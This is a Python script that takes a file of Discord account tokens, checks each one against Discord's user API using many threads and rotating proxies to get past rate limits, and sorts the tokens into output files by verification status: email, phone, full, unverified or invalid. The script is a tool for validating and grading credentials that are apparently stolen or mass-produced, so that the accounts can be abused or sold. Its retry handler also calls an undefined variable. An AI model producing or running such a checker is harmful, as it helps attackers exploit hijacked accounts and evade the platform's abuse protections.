import requests, concurrent.futures, yaml, random, time, datetime, os

config = yaml.safe_load(open('config.yml'))
now = datetime.datetime.now(datetime.timezone.utc)
directory = f'output/{now.strftime("%d-%m-%Y %H;%M;%S")}'
os.makedirs(directory, exist_ok=True)

def get_type(token):
    try:
        token_type = ''
        session = requests.Session()
        if config['proxies']:
            proxylist = open('proxies.txt', 'r').read().splitlines()
            session.proxies = {
                'http': f'http://{random.choice(proxylist)}',
                'https': f'http://{random.choice(proxylist)}'
            }
        response = session.get(f'https://discord.com/api/v9/users/@me', headers={'Authorization': token.split(':')[-1]})
        if response.status_code == 429:
            print('Rate limited, use proxies or try in a few days after cloudfare clears your IP.')
            session.close()
            return token_type
        
        if response.status_code == 200:
            user = response.json()
            if user['email']:
                if user['verified']:
                    if user['phone']:
                        token_type = 'FV'
                        with open(f"{directory}/FV.txt", "a") as f:
                            f.write(f"{token}\n")
                    else:
                        token_type = 'EV'
                        with open(f"{directory}/EV.txt", "a") as f:
                            f.write(f"{token}\n")
                else:
                    if user['phone']:
                        token_type = 'PV'
                        with open(f"{directory}/PV.txt", "a") as f:
                            f.write(f"{token}\n")
                    else:
                        token_type = 'UV'
                        with open(f"{directory}/UV.txt", "a") as f:
                            f.write(f"{token}\n")
            else:
                token_type = 'UC'
                with open(f"{directory}/UC.txt", "a") as f:
                    f.write(f"{token}\n")
        elif response.status_code == 401:
            token_type = 'IV'
            with open(f"{directory}/IV.txt", "a") as f:
                f.write(f"{token}\n")
        else:
            token_type = 'UV'
            with open(f"{directory}/UV.txt", "a") as f:
                f.write(f"{token}\n")
                    
        session.close()
        return token_type
    
    except Exception as e:
        print(e)
        get_type(fulltoken)
        
        
with concurrent.futures.ThreadPoolExecutor(max_workers=config['max_threads']) as executor:
    tokens = open('tokens.txt', 'r').read().splitlines()
    start = time.time()
    for token in tokens:
        executor.submit(get_type, token)
